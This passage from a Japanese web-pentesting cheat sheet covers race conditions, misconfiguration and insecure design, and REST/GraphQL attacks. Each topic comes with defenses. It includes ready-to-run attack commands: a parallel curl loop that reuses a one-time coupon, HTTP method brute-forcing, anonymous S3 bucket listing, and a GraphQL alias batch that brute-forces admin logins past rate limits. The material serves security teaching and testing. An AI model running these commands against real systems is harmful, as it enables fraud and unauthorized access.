要点 / key takeaways
  • XSS は出力コンテキスト (HTML / 属性 / JS / URL) を特定してから payload を選択
  • DOM XSS は source (location.hash 等) → sink (innerHTML 等) の追跡が肝、DOM Invader が有効
  • Blind XSS は管理画面等の遅延実行環境が標的、OOB コールバック (外部 JS 読込) で発火を検知
  • XSS の本質は被害者権限での行動: Saved Password 窃取 / Phishing / XSS-driven CSRF (HttpOnly でも fetch は cookie 自動付与)
  • SOP は「読取」を、SameSite は「cookie 送信」を制御する別々の境界。混同しない
  • CSRF はトークン欠如 + SameSite 設定不備が前提、状態変更リクエストが標的
  • CORS は「Origin 反射 + Allow-Credentials: true」の組み合わせが致命的

09Race Conditions競合状態

複数リクエストが同一の共有状態 (DB レコード / 残高 / 適用フラグ) を同時に read-modify-write することで、検証と実行の間の隙 (TOCTOU) を突く。単発では正しく弾かれる操作を、並行実行で「制限を超過」させる。

典型シナリオ (limit overrun)

いずれも「検証 → 実行」の間に別リクエストが割り込む構造。1 回しか使えないクーポンの多重適用、残高チェックを回避した多重送金 / 出金、招待コードやギフトカードの多重利用、レート制限のすり抜けなど。

bash
# curl の並行実行で同一リクエストを同時発火 (簡易検証)
for i in $(seq 1 30); do
  curl -sk "https://target.example.com/api/coupon/apply" \
    -H "Authorization: Bearer <TOKEN>" \
    -d '{"code":"SAVE50"}' &
done; wait
Burp workflow Race Condition は Turbo Intruder と Repeater の parallel / single-packet attack が決定版。同一の状態変更リクエストを Repeater の tab group にまとめ "Send group in parallel" で同時送信すると、ネットワークジッタを排した精密な同時到達が得られる。HTTP/2 対応サーバでは single-packet attack が最も信頼性が高い。Turbo Intruder は race-single-packet-attack.py テンプレートで大量同時リクエストをスクリプト制御できる。
防御 / countermeasures
  • DB レベルの排他制御 (SELECT ... FOR UPDATE / 行ロック) と適切なトランザクション分離レベル
  • read-modify-write を単一のアトミック操作に (原子的デクリメント / 条件付き UPDATE)
  • べき等キー (idempotency key) で重複リクエストを排除
  • 状態遷移をサーバ側で一意化、クライアント提供の状態を信頼しない
  • レート制限をアトミックなカウンタ (Redis INCR 等) で実装
要点 / key takeaways
  • Race Condition は「検証と実行の間の隙 (TOCTOU)」を並行リクエストで突く
  • クーポン / 残高 / ギフトカード / レート制限など「1 回だけ」の制約が標的
  • Burp の single-packet attack (HTTP/2) が最も精密、Turbo Intruder でスクリプト制御
  • 防御はアトミック操作 + 行ロック + べき等キーが基本

10Config & Design設定不備・設計欠陥

個別の注入系脆弱性ではなく、設定・設計・依存関係のレベルで生じる問題。OWASP Top 10 の Security Misconfiguration / Insecure Design / Vulnerable Components に対応する。コマンドより「観点」と「チェックリスト」が中心。

Security Misconfiguration

本来は正しく設定できたはずの項目が放置された結果生じる。最新パッチ適用済みでも設定次第で露出する。

典型的な確認項目
  • クラウドストレージの公開設定 (パブリックな S3 バケット / Blob コンテナ)
  • デフォルト認証情報の未変更 (admin/admin、製品既定パスワード)
  • 不要な機能・ページ・アカウント・権限の有効化
  • 詳細なエラーメッセージ (スタックトレース / パス / バージョン露出)
  • セキュリティヘッダの欠如 (CSP / X-Frame-Options / HSTS / X-Content-Type-Options)
  • 管理インターフェース / デバッグエンドポイントの公開
bash
# セキュリティヘッダの確認
curl -sI https://target.example.com | grep -iE 'content-security-policy|x-frame-options|strict-transport|x-content-type'

# nuclei の misconfiguration テンプレート
nuclei -u https://target.example.com -t http/misconfiguration/

# 公開 S3 バケットの確認
curl -s https://<BUCKET>.s3.amazonaws.com/
aws s3 ls s3://<BUCKET>/ --no-sign-request

Insecure Design

実装ミスや設定ミスではなく、アーキテクチャ / 設計そのものに内在する欠陥。脅威モデリング不足が原因で、コードが「仕様通り」でも脆弱になる。

設計欠陥の例
  • テスト用の抜け道が本番に残存 (OTP 検証の無効化、デバッグバイパス)
  • レート制限が IP 単位のみ — 複数 IP 分散でブルートフォース可能 (例: 6 桁コード = 100 万通り、250 回/IP 制限なら約 4,000 IP で全探索、クラウドで現実的)
  • ビジネスロジックの前提破綻 (「ユーザは分散攻撃しない」等の暗黙の仮定)
  • 多段階フローの中間状態を検証しない (s09 Race Condition とも接続)

Vulnerable & Outdated Components

既知の脆弱性を持つライブラリ / フレームワーク / ソフトウェアの使用。既製の exploit が Exploit-DB 等に存在すれば、攻撃者の労力は最小で済む。

bash
# バージョン指紋 → 既知 CVE 照合
whatweb -a 3 https://target.example.com
nuclei -u https://target.example.com -t http/cves/ -t http/vulnerabilities/

# CMS 別スキャナ
wpscan --url https://target.example.com --enumerate vp,vt,u
droopescan scan drupal -u https://target.example.com

# 既知 exploit 検索
searchsploit <PRODUCT> <VERSION>
防御 / countermeasures
  • Misconfig: セキュアなベースライン設定を IaC で標準化、CIS Benchmark 準拠、不要機能を無効化
  • Misconfig: エラーは汎用メッセージに統一、セキュリティヘッダを全レスポンスで付与
  • Design: 開発初期の脅威モデリング、テスト用バイパスの本番混入を CI で検出
  • Design: レート制限をアカウント / 操作単位でも適用 (IP 単位だけに依存しない)
  • Components: SBOM 管理 + SCA ツール (Dependabot / Snyk) で既知 CVE を継続監視、定期更新
要点 / key takeaways
  • Misconfiguration は「設定できたのに放置」が本質、S3 公開 / デフォルト認証情報 / ヘッダ欠如が定番
  • Insecure Design は実装でなく設計の欠陥、レート制限の IP 単位依存が典型的な破綻例
  • Vulnerable Components はバージョン指紋 → 既知 CVE 照合が起点、既製 exploit で低労力
  • これら 3 カテゴリは単発 payload でなく「観点」で検出する、nuclei のテンプレート群が有効

11APIAPI

REST / GraphQL API 固有の攻撃面。過剰なデータ露出、レート制限不備、GraphQL の introspection とバッチクエリ悪用が中心。

REST API

bash
# メソッド総当たり (制限された操作の露出)
for m in GET POST PUT DELETE PATCH OPTIONS; do
  echo "== $m =="
  curl -sk -X $m "https://target.example.com/api/user/1" -H "Authorization: Bearer <TOKEN>" -o /dev/null -w "%{http_code}\n"
done

# バージョン差異の悪用 (旧 API の脆弱性残存)
# /api/v1/ /api/v2/ /api/internal/

# ドキュメント / スキーマ探索
curl -s https://target.example.com/swagger.json
curl -s https://target.example.com/openapi.json
curl -s https://target.example.com/api/docs

GraphQL

bash
# introspection でスキーマ全体を取得
curl -s https://target.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# introspection query (完全版は clairvoyance / graphw00f で自動化)
# graphw00f -d -f -t https://target.example.com/graphql
graphql
# バッチクエリでレート制限回避 (bruteforce 増幅)
{
  a1: login(user:"admin", pass:"p1") { token }
  a2: login(user:"admin", pass:"p2") { token }
  a3: login(user:"admin", pass:"p3") { token }
}

# alias によるフィールド重複要求 / DoS
# ネスト深いクエリで resource exhaustion
Burp workflow GraphQL は InQL 拡張で introspection を自動取得し、スキーマからクエリテンプレートを生成する。REST は Repeater でメソッド / バージョン / パラメータを差し替え、Content Type Converter 拡張で JSON↔XML↔form を変換して検証。API のドキュメント (swagger / openapi) を取得できたら、エンドポイント一覧を Intruder に流し込んで一括探索。認可テストは s3 と同様 Autorize で低権限アクセスを自動判定。
防御 / countermeasures
  • 本番で GraphQL introspection を無効化、スキーマ露出を防ぐ
  • クエリの深さ / 複雑度制限、バッチクエリ数の上限設定 (DoS / bruteforce 増幅対策)
  • レート制限を API ゲートウェイで一元適用、認証エンドポイントは特に厳格に
  • 過剰なデータ露出を避け、レスポンスフィールドを必要最小限に (BOLA / excessive data exposure)
  • 旧バージョン API を廃止、swagger / openapi ドキュメントを本番非公開に
要点 / key takeaways
  • REST はメソッド総当たり + バージョン差異 + スキーマ露出 (swagger) が探索の起点
  • GraphQL は introspection でスキーマ全取得 → InQL でクエリ生成が定石
  • GraphQL バッチクエリはレート制限を回避して bruteforce を増幅する
  • API の認可不備 (BOLA / IDOR) は s3 Access Control と同じ手法で Autorize 検証
